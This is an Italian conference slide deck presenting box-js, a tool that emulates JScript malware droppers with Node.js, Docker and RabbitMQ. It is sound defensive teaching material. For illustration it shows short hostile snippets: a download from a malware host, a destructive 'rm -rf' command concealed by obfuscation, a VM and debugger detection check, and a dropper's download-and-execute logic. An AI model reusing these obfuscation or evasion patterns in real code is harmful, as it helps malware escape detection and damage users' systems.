<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="author" content="CapacitorSet"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><link rel="stylesheet" href="../common/css/reveal.css"><link id="theme" rel="stylesheet" href="../common/css/theme/white.css"><link rel="stylesheet" href="../common/lib/css/monokai-sublime.css"><style>tt {
	font-family: monospace !important;
}
.pro {
	color: #43a047; // Material green 600
}
.contro {
	color: #e53935; // Material red 600
}
</style><title>Automatizzare la malware analysis con Node.js, Docker e RabbitMQ</title></head><body><div class="reveal"><div class="slides"><section><section id="title"><h3>Automatizzare la malware analysis con Node.js, Docker e RabbitMQ</h3><hr><p>@CapacitorSet</p></section></section><section><p>Queste slide sono state presentate a <a href="http://endsummercamp.org/">ESC17</a>, e illustrano il funzionamento di box-js a grandi linee.</p><p>Attenzione: molte slide si sviluppano verso il basso, non verso destra.</p><p>Alcune slide sono corredate di "speaker notes" (appunti personali non visibili al pubblico), che compariranno in un riquadro grigio.</p><aside class="notes">Speaker notes here</aside></section><section><aside class="notes">Scenario tipico: social engineering. L'infezione è divisa in più stadi. La si può prevenire in diversi modi: a noi interessa il dropper.</aside><div style="display: flex;"><div style="flex: 0 0 70%;"><img src="../common/img/thunderbird.png"></div><div style="flex: 1;"><ul><li class="fragment">1° stadio: <tt>fattura UPS.js</tt></li><li class="fragment">Utente apre il file, che scarica...</li><li class="fragment">2° stadio: <tt>locky.exe</tt></li></ul></div></div></section><section><section><ol><li><strong>Reverse engineering manuale</strong></li><li>Analisi in VM</li><li>Emulazione</li></ol><aside class="notes">Ci sono diversi approcci. [Scorrere verso il basso]</aside></section><section><aside class="notes">Diversivo contro le euristiche degli antivirus, e contro l'analisi manuale</aside><p>Codice originale: presente, ma illeggibile</p><img src="../common/img/ugly.png"></section><section><p>Codice formattato</p><img src="../common/img/beautify.png"></section><section><h3>Offuscamento</h3><p>Codice equivalente, ma meno leggibile</p><style>.striped td {
	border: 1px black solid !important;
}
.striped tr {
	background-color: #eee;
}
.striped tr:nth-child(even) {
	background-color: #ccc;
}</style><table class="striped" style="font-size: 26px; border: 2px black solid;"><tr><td><tt>download("http://malware.ru/")</tt></td><td><tt>download(base64decode("..."))</tt></td><td>Uso di codifiche</td></tr><tr><td><tt>beEvil();</tt></td><td><tt>code = decrypt("..."); eval(code)</tt></td><td>Uso di crittografia (XOR)</td></tr><tr><td><tt>shell.Execute("rm -rf *");</tt></td><td><tt>things = ["rm&nbsp;-rf&nbsp;*",&nbsp;"Execute"]; shell[things[1]](things[0]);</tt></td><td>Costanti &rarr; variabili in array</td></tr><!--trtd: tt if (HTTPstatus == 200) success();
td: tt HTTPstatus == 0xC8 && success();
td Trasformazione dei costrutti--></table><aside class="notes">Le due versioni sono <u>funzionalmente equivalenti</u>, ma una è meno leggibile</aside></section><section><h3>Risultato finale</h3><img src="../common/img/clean.png"></section><section><strong>Algoritmo</strong><br><ol><li><tt>listaUrl = [20 URL...</tt>]</li><li>Per ogni elemento di <tt>listaUrl</tt>:</li><ol><li>Fai una richiesta GET</li><li>Se la risposta non è ok (404 not found, irraggiungibile, etc.) passa al prossimo</li><li>Se la risposta non è un eseguibile, passa al prossimo</li><li>Salva la risposta su <tt>%TEMP%/nomerandom.exe</tt></li><li>Esegui il file</li></ol></ol></section><section><ul><div class="pro"><li>Comprensione accurata</li></div><div class="contro"><li>Da 15 minuti a 1 ora</li><li>Richiede una conoscenza approfondita di JScript</li></div></ul></section></section><section><section><ol><li>Reverse engineering manuale</li><li><strong>Analisi in VM</strong></li><li>Emulazione</li></ol></section><section><img src="diagrams/VM_stack.svg"><br><i>Virtualizziamo Windows</i></section><section><h3>Monitoraggio</h3><ul><aside class="notes">API Windows: con l'intercettazione "rilevo tutte le interazioni"</aside><li>Intercettare le chiamate all'API Windows<ul><li>lettura registro di sistema</li><li>crea nuovo processo</li><li>...</li></ul></li><li>Monitoraggio della memoria</li><li>Monitoraggio del disco</li><li>Monitoraggio del traffico di rete (DNS, download, etc)</li></ul></section><section><h3>Problemi</h3><p>I malware adottano misure contro l'analisi automatica:</p><ul><li>Controllano di non essere in una VM</li><li>Controllano la presenza di processi di monitoraggio</li></ul><pre><code class="js">processi = GetObject("WinMgmts:").InstancesOf("Win32_Process")
isVM = false;
for (i = 0; i < processi.length; i++) {
	if (processi[i] == "Wireshark.exe") isVM = true;
	if (processi[i] == "OllyDbg.exe") isVM = true;
	if (processi[i] == "...") isVM = true;
}
if (!isVM) {
	// ...
}</code></pre></section><section><h3>Risultati</h3><ol><li>Connesso a sito1.com... timeout.</li><li>Connesso a sito2.it... collegato.<small class="contro">Contro: non tutti gli URL vengono scoperti!</small></li><li>Scaricato http://sito2.it/locky.exe</li><li>Salvato C:\TEMP\locky.exe</li><li>Eseguito C:\TEMP\locky.exe<small class="pro">Pro: analizziamo anche il virus vero e proprio</small></li><li>locky.exe ha criptato il file Desktop\foto.jpg</li><li>...</li></ol></section><section><div style="text-align: left;"><ul><div class="pro"><li><i>Veloce</i>: 2-3 minuti, 100% automatico</li><li>Analizza sia il dropper, sia il virus</li></div><div class="contro"><li>1-2 GB RAM, >50 GB HDD</li><li>Procedimento opaco, difficile da debuggare</li></div></ul></div><aside class="notes">Opaco perché non posso modificare facilmente il funzionamento dell'interprete</aside></section></section><section><section><ol><li>Reverse engineering manuale</li><li>Analisi in VM</li><li><strong>Emulazione</strong></li></ol></section><section><table><tr><td><img src="diagrams/VM_stack.svg" style="opacity: 0.5;"></td><td><img src="diagrams/Box_stack.svg"></td></tr><tr><td style="text-align: center;"><del>Virtualizziamo Windows</del></td><td style="text-align: center;"><em>Emuliamo</em> l'ambiente Javascript</td></tr></table><div style="display: flex;"><div style="flex: 0 0 40%;"><br></div><div style="flex: 0 0 60%;"></div></div></section><section><p>Microsoft JScript è un <u>dialetto</u> di JavaScript</p><p>Un qualsiasi motore JavaScript può eseguire JScript, con delle modifiche</p><div class="fragment"><p>Quale motore? <strong>Node.js</strong> (V8). Sviluppato da Google, funziona da riga di comando, stesso motore di Chrome</p></div></section><section><h4>Librerie ActiveX</h4><img src="diagrams/ActiveX.svg" style="border: 0;"><p>Vogliamo creare librerie "finte", che emulano quelle reali e catturano informazioni</p><aside class="notes">= <u>far credere</u> al sample di funzionare correttamente</aside></section><style>.rootCall {
	color: #e53935;
}
.rewriteCall {
	color: #ffb300;
}
.argument {
	color: #7cb342;
}</style><section><h3>Stubs</h3><p>Sono versioni fittizie (<i>stub</i>) dei componenti ActiveX che ci interessano</p><p>Sembrano funzionare correttamente, ma "registrano" le interazioni:</p><pre><code class="js" style="width: 900px;">class XMLHTTP {
	download(url) {
		headers["User-Agent"] = "Internet Explorer 6.0";
		print(`Nuova richiesta a ${url}`);
		output = request("GET", url);
		print(`Ho scaricato ${output.length} byte.`);
		print("Tipo di file: " + identify(output));
		return output;
	}
}</code></pre></section><section><h3>AST rewriting</h3><p>Dissezioniamo il codice e aggiungiamo dei pezzi</p><div style="display: flex;"><div style="flex: 0 0 50%;"><img src="diagrams/vanilla_AST.dot.svg"><code><span class="rootCall">eval</span>(<span class="argument">pippo.decrypt() + "unknown code"</span>)</code></div><div class="fragment" style="flex: 0 0 20%;"><img src="diagrams/rewritten_AST.dot.svg"><code> <span class="rootCall">eval</span>(<span class="rewriteCall">rewrite</span>(<span class="argument">pippo.decrypt() + "unknown code"</span>))</code></div></div><aside class="notes">È un modo più comodo di manipolare il codice</aside></section><section><strong>Risultati</strong><br><ol><li><tt>listaUrl = [20 URL...</tt>]</li><li>Per ogni elemento di <tt>listaUrl</tt>:</li><ol><li>Fai una richiesta GET<br><small>Analisi offline</small></li><li>Se la risposta non è ok (404 not found, irraggiungibile, etc.) passa al prossimo</li><li>Se la risposta non è un eseguibile, passa al prossimo</li><li>Salva la risposta su <tt>%TEMP%/nomerandom.exe</tt></li><li>Esegui il file</li></ol></ol></section><section><ul><div class="pro"><li><i>Velocissimo</i>: da 5 a 90 secondi</li><li>Tiny footprint: ~50 MB RAM</li><li>Più flessibile &rarr; più potente</li><li>Facile da debuggare</li></div><div class="contro"><li>Richiede patch/bugfix</li><li>Può richiedere l'intervento umano</li></div></ul><aside class="notes">Richiede patch perché bisogna riscrivere da zero tutto ActiveX, e questo può comportare degli errori</aside></section></section><section><i>demo</i><hr><p>Nota per il lettore: in questa fase, apro un terminale, do il comando per analizzare un sample, e spiego l'output di box-js. In particolare, provo prima l'analisi offline e poi quella con --download, dove faccio vedere che il secondo stadio viene scaricato correttamente, infine carico il secondo stadio su VirusTotal e verifico che è malevolo.</p></section><section><section><p>Nella pratica:</p><h2>Malware analysis pipeline</h2><!--p Automatizzare la malware analysis<br>[con Node.js, Docker e RabbitMQ]
br--><img src="diagrams/Pipeline.svg" style="border: 0;"></section><section><p>Esigenza: creare un ambiente isolato, e facile da riprodurre</p><p>Usiamo i container di <strong>Docker</strong>: isolati dall'host, istanziati con un semplice comando:</p><pre><code class="bash">docker run CapacitorSet/box-js     \ # Nome immagine
    --volume ~/sample.js:/samples/ \ # Cartelle condivise
    --env "QUEUE_IP=172.17.0.1"      # Variabili d'ambiente</code></pre></section><section><p>Esigenza: gestire una coda di sample da analizzare, con diversi worker</p><p>Con <strong>RabbitMQ</strong> creiamo una <i>work queue</i></p><img src="../common/img/queue.gif"><p>Approccio facilmente scalabile: possiamo aggiungere e togliere worker a piacimento</p></section><section><h3>Applicazioni</h3><p>Scenario tipico: ricercatore/azienda nel campo della malware analysis</p><p>L'utente estrae velocemente i secondi stadi, in forma di URL o di file, e li può analizzare con VirusTotal/Malwr/altre sandbox</p><br><p>In sintesi: l'emulazione semplifica e velocizza l'analisi del primo stadio dell'infezione, e produce analisi più accurate</p></section></section><section><h3 style="text-transform: none;">@CapacitorSet</h3><img style="border: 0;" src="../common/img/github.png"><p>Il mio progetto di malware analysis:</p><tt>https://github.com/CapacitorSet/box-js</tt></section></div></div><script src="../common/lib/js/head.min.js"></script><script src="../common/js/reveal.min.js"></script><script>// More info https://github.com/hakimel/reveal.js#configuration
Reveal.initialize({
	controls: true,
	progress: true,
	history: true,
	center: true,

	transition: 'slide', // none/fade/slide/convex/concave/zoom
	showNotes: true,

	// More info https://github.com/hakimel/reveal.js#dependencies
	dependencies: [
		{ src: '../common/lib/js/classList.min.js', condition: function() { return !document.body.classList; } },
		{ src: '../common/plugin/notes/notes.js', async: true },
		{ src: '../common/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
	]
});</script></body></html>